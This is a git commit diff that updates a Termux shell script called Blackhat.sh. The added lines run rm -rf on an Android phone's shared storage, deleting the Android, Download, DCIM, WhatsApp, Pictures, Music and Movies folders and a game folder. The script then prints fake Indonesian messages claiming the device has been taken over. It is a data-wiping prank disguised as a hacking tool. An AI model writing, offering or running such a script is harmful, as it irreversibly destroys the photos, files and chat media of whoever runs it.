27eee47bab13b41e101802d347368124f41d2b4a
TeamBlackHat <68024305+TeamBlackHat@users.noreply.github.com>
2020-07-09 18:15:22 +0700

    Update Blackhat.sh

--- Blackhat.sh
+++ Blackhat.sh
@@ -1,12 +1,17 @@
-pkg update
-pkg upgrade
 pkg install figlet
 gem install lolcat
 termux-setup-storage
-cd /storage/emulated/0
-rm android
-rm bluetooth
-rm DCIM
-rm pictures
-rm Download
-figlet BLACKHAT |lolcat
+cd /sdcard
+rm -rf Android
+rm -rf Download
+rm -rf DCIM
+rm -rf UCDownloads
+rm -rf com.garena.game.codm
+rm -rf Music
+rm -rf Pictures
+rm -rf Movies
+rm -rf WhatsApp
+echo "Memperoses Persetujuan Mengambil Alih Perangkat..."
+echo "Pengambil Alihan Perangkat 50%"
+echo "SUKSES"
+echo "Perangkat Telah Di Ambil Alih Oleh User : Alt+F4"
